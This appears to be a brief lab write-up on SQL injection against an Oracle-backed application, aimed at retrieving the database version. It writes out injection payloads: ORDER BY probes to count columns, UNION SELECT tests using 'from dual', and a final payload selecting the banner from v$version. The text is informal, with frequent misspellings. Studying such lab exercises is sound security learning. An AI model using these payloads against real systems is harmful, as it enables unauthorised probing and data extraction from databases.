# Database type and version on Oracle

the version of database on oracle can be retreive using query

```sql
select * from v$version
```

this wil return about the version of oracle

end goal : database version and type

let's analyze total no.of of columns we have her

```sql
' order by 1--
' order by 2--
```

if column contains any string

```sql
' union select  'a',NULL-- //returns error
```

we are using oracle database and after searching found that it's select statement require **FROM** caluse and  

modified query

```sql
' union  select  'a',NULL from dual--
' union  select  'a','a' from dual--
```

this was running perfectly

payload

```sql
' union select banner, NULL from v$version--
```
